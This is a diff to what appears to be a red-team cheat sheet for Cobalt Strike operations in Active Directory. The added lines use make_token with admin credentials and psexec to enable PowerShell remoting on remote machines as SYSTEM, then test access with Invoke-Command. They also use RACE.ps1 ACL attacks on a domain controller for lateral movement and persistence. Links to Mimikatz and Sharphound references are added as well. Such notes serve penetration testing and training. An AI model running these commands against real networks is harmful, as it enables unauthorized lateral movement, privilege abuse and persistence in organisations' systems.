@@ -41,12 +41,21 @@ Invoke-TheHash
 
 Enable Powershell Remoting manually
 ```
-# powershell 
+Enable on local system with Admin privileges
+# powershell Enable-PSRemoting –Force
+
+Enable on remote system 
+# make_token AD\admin adminpassword --> requires Admin privileges on remote system
+# shell psexec.exe \\TestComputer -h -s powershell.exe Enable-PSRemoting -Force
+
+Test remote access
+# powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
 ```
 
 [RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
 ```
 # powershell-import --> RACE.ps1
+# make_token AD\Admin password --> This tool will require Admin privileges on the remote system
 # powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-dc.lab.com
 # powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-dc.lab.com
 ```
@@ -139,5 +148,7 @@ fill
 [Cobalt Strike commands cheat-sheet](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
 
 [Sharphound](https://github.com/BloodHoundAD/SharpHound3)
+
+[PowerShell remoting cheat sheet](https://blog.netspi.com/powershell-remoting-cheatsheet/)
 
 [Mimikatz reference cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
